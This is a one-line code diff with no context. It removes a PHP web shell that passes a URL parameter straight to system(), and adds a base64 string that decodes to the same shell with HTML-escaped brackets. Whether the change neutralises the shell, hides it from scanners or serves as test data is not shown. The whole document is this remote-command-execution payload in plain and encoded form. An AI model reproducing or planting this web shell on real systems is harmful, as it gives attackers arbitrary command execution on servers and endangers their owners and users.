@@ -1,1 +1,1 @@
-<?php system($_GET["cmd"])?>
+Jmx0Oz9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk/Jmd0Ow==
